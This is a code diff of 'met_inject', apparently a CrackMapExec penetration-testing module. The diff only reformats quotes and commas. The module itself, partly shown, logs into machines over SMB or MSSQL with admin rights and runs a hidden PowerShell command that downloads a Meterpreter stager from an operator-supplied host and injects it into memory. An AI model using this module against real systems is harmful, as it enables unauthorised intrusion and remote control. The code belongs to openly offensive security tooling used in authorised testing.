@@ -9,6 +9,7 @@ class CMEModule:
     Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
     Module by @byt3bl33d3r
     """
+
     name = "met_inject"
     description = "Downloads the Meterpreter stager and injects it into memory"
     supported_protocols = ["smb", "mssql"]
@@ -41,19 +42,19 @@ class CMEModule:
             after running, copy the end of the URL printed (e.g. M5LemwmDHV) and set RAND to that
         """
 
-        self.met_ssl = 'https'
+        self.met_ssl = "https"
 
-        if 'SRVHOST' not in module_options or 'SRVPORT' not in module_options:
-            context.log.fail('SRVHOST and SRVPORT options are required!')
+        if "SRVHOST" not in module_options or "SRVPORT" not in module_options:
+            context.log.fail("SRVHOST and SRVPORT options are required!")
             exit(1)
 
-        if 'SSL' in module_options:
-            self.met_ssl = module_options['SSL']
-        if 'RAND' in module_options:
-            self.rand = module_options['RAND']
+        if "SSL" in module_options:
+            self.met_ssl = module_options["SSL"]
+        if "RAND" in module_options:
+            self.rand = module_options["RAND"]
 
-        self.srvhost = module_options['SRVHOST']
-        self.srvport = module_options['SRVPORT']
+        self.srvhost = module_options["SRVHOST"]
+        self.srvport = module_options["SRVPORT"]
 
     def on_admin_login(self, context, connection):
         # stolen from https://github.com/jaredhaight/Invoke-MetasploitPayload
@@ -69,10 +70,11 @@ class CMEModule:
         $ProcessInfo.CreateNoWindow = $True
         $ProcessInfo.WindowStyle = "Hidden"
         $Process = [System.Diagnostics.Process]::Start($ProcessInfo)""".format(
-            'http' if self.met_ssl == 'http' else 'https',
+            "http" if self.met_ssl == "http" else "https",
             self.srvhost,
             self.srvport,
-            self.rand)
+            self.rand,
+        )
         context.log.debug(command)
         connection.ps_execute(command, force_ps32=True)
-        context.log.success('Executed payload')
+        context.log.success("Executed payload")
